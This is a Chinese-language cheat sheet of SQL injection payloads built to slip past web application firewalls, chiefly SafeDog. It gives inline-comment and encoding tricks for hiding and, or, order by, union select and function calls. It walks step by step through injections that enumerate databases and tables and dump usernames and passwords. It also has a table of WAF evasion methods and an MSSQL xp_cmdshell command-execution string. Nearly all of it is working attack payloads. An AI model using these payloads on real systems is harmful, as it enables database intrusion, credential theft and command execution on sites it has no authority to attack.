## 最新版
### 安全狗and的绕过（防止and和or的注入）
将and修改为/*!12345and*/ ps:12345是任意的5位数字\
通过bp进行拦截，发送到intruder模块，进行爆破找特征值 返回结果正常即是可以被正常绕过\
4-6位都可以

### 安全狗order by的绕过
order by一起出现会引发安全狗警告，要在order by之间添加一些字符\
order /*//%$*/ by 1 -- 1

### 安全狗select　union的绕过（防止联合查询）
select和union在一起的时候会触发\
跟order by原理相同，不过需要我们用bp进行fuzz\
?id=-2' union /*/$%^*/ select 1,2,3 -- 1

### 查询数据的绕过
#### database()的绕过：
database和()放在一起的时候会触发waf\
在两者之间添加干扰符即可\
?id=-2' union /*/$%^*/ select 1,database/*////*/(),3 -- 1
#### 查询表的绕过：
第一个绕过点：\
information_schema.tables\
waf会对tables进行拦截，想绕过需改成information_schema./*!tables*/\
第二个绕过点：\
from和information_schema./*!tables*/当这两个放在一起的时候会触发waf，这个时候要对from和information.schema./*!tables*/之间进行处理了\
?id=-2' union /*/$%^*/ select 1,group_concat(table_name),3 from --+/*%/ %0a\
information_schema./*!tables*/ -- 1
绕过过程：首先在union和select之间放干扰符号，然后在from和information_schema之间放 --+以及正确的干扰符，然后通过%0a进行换行，最后对talbe进行内联\
但是还要通过where去指定对应的数据库\
?id=-2' union /*/$%^*/ select 1,group_concat(table_name),3 from --+/*%/ %0a\
information_schema./*!tables*/ where table_name='security' -- 1\
但是information_schema和where出现在一起需要在中间添加干扰符\
?id=-2' union /*/$%^*/ select 1,group_concat(table_name),3 from --+/*%/ %0a\
information_schema./*!tables*/ /*////*/\
where table_schema='security' -- 1  进行fuzz测试\
获取security对应表下的所有列名：\
?id=-2' union /*/$%^*/ select 1,group_concat(column_name),3 from --+/*%/ %0a\
information_schema./*!columns*/ /*////*/\
where table_schema='security' /*!12441and*/ table_name='users' -- 1
#### 查询数据的绕过：
?id=-2' union /*/$%^*/ select 1,group_concat(username,0x3a,password),3 from /*////*/ users -- +

---

| 方法                                      | payload                                                                                                                                                                                                                                                                                                                                                                  |
|-------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 编码                                      | 1、进行url编码（少数waf不会进行URL解码,部分waf进行一次url解码==>可对payload进行二次url编码）<br>2、Unicode编码：单引号 = %u0027、%u02b9、%u02bc<br>3、部分十六进制编码：adminuser = 0x61646D696E75736572<br>4、SQL编码：unicode、HEX、URL、ascll、base64等<br>5、XSS编码：HTML、URL、ASCII、JS编码、base64等                                                                           |
| 大小写变换                                 | select=SELecT<br>关键字替换<br>And = &&<br>Or = \|\|<br>等于号 = like （或使用’<’ 和 ‘>’ 进行判断）<br>if(a,b,c) = case when(A) then B else C end<br>substr(str,1,1) = substr (str) from 1 for 1<br>limit 1,1 = limit 1 offset 1<br>Union select 1,2 = union select * from ((select 1)A join (select 2)B;<br>hex()、bin() = ascii()<br>sleep() = benchmark()<br>concat_ws() = group_concat()<br>mid()、substr() = substring()<br>@@user = user()<br>@@datadir = datadir() |
| 特殊字符替换（空格或注释绕过）               | sqlserver中：/**/、/\*|%23--%23|\*/ <br>mysql中：%0a、%0a/**/、/\*/\!*//、#A%0a                                                                                                                                                                                                                                                                                                  |
| 特殊字符重写绕过                           | selselectect                                                                                                                                                                                                                                                                                                                                                             |
| 多请求拆分绕过                             | ?a=[inputa]&b=[inputb]  ===》(参数拼接)  and a=[inputa] and b=[inputb]                                                                                                                                                                                                                                                                                                   |
| 参数放Cookie里面进行绕过                    | $_REQUEST（获取参数，会获取GET POST COOKIE）===>  若未检测cookie，我们可以放cookie里面                                                                                                                                                                                                                                                                                     |
| 使用白名单绕过                             | admin dede install等目录特殊目录在白名单内<br>URL/xxx.php?id=1 union select …… ===》<br>1、URL/xxx.php/admin?id=1 union select……<br>2、URL/admin/..\xxx.php?id=1 union select……                                                                                                                                                                                       |
| 内联注释绕过                               | id=1 and 1=1 ===》  id=1/\*!and\*/1=1                                                                                                                                                                                                                                                                                                                                    |
| 参数重写绕过                               | URL/xx.php?id=1 union select  ===》<br>URL/xx.php?id=1&id=union&id=select&id=……&id=                                                                                                                                                                                                                                                                                      |
| 特殊字符拼接                               | mssql中，函数里面可以用+来拼接 ?id=1;exec('maste'+'r..xp'+'_cmdshell'+'"net user"')                                                                                                                                                                                                                                                                                     |
| 云waf                                     | ===》找真实IP<br>http协议绕过<br>Content-Type绕过：application/x-www-form-urlencoded è multipart/form-data<br>请求方式绕过：更换请求方法<br>多Content-Disposition绕过：包含多个Content-Disposition时，中间件与waf取值不同<br>keep-alive（Pipeline）绕过：手动设置Connection:keep-alive（未断开），然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf<br>修改编码方式：Charset=xxx进行绕过 |
| Waf检测限制绕过                          | 参数溢出<br>缓冲区溢出：<br>UnIoN SeLeCT ===》 and (select 1)=(Select 0xA*99999) UnIoN SeLeCT and 1=1 ===》 and 1=1 and 99…99999 //此处省略N多个9同网段/ssrf绕过                                                                                                                                                                                                           |
                                    

---

#### 1=1绕过
'and 1=1-- -被拦截\
&符号可以绕\
'%261-- -\
'%26true-- -\
'%260-- -\
'%26false-- -\
xor可以绕\
'Xor 1-- -\
'Xor true-- -

#### 'or length(database()=4)-- -会被ban，这样绕：\
'%26(length(database/**/())=4)-- -\
'%26(ascii(@@version)=53)-- -\
1'or -1=-1-- -\
1'or -0=-0-- -

#### 内联注释
1'or /*!1=1*/-- -\
或者简单粗暴点的 或者简单粗暴点的 直接绕过and和or：\
/*!11440OR*/\
/*!11440AND*/



#### order by绕过
%23%0a绕过\
order%23%0aby 3\
内联注释加注释绕过\
1'/*!order /*!/*/**/by*/4-- -\
1'/*!order /*/*%/**/by*/4-- -\
1'/*!order /*!/*/**//**/by*/4-- -\
1'/*!order /*!/*/**//*/**/by*/4-- -\
同样类似上面绕过and方法\
/*!11440order*/



#### union select绕过
利用内联注释和注释的混淆绕过\
1'/*!union/*!/*/**/*/select/**/1,2,'password'-- -\
/*!11440union*/\
/*!select/*!/*/**/*/


#### 系统函数绕过
单独的括号和函数名都不会检测，分开函数名和括号：\
version () #直接空格\
user%0a() #这个地方%0a~%20有很多，类似绕过空格\
database/**/() #注释符\
user/*!*/() #内敛注释


#### 函数名绕过
/*!extractvalue/*!/*/**/*/\
/*!updatexml/*!/*/**/*/

#### 联合注入绕过方式
这里使用mysql自带的正则函数(regexp)

select * from company_info where name like '桑尼';  //查询name等于桑尼的数据\
select * from company_info where name regexp '桑尼'; //查询结果中name包含桑尼的数据

#### 获取详细信息
尝试获取数据库名、版本，因database()被识别被拦截\
-1' regexp "%0A%23" /*!11444union*/ %0A /*!11444select*/ 1,database(/*!11444*/),version(/*!11444*/) %23

#### 注入出表名
-1' union /*!--+/*%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/

/*!--+/*%0ainformation_schema./*!schemata*/ --+
